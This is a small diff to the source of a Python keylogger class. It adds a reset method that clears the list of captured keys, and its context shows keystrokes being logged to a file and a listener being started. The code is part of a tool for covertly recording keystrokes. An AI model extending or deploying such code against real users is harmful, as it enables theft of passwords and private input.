@@ -44,7 +44,10 @@ class KeyLogger:
                 f.write(str(key))
                 f.write("\n")
         f.close()
-        
+
+    def reset(self):
+        self.a_keys[:] = []
+
     def start(self):
         """Starts the keylogger"""
         self.a_listener.start()
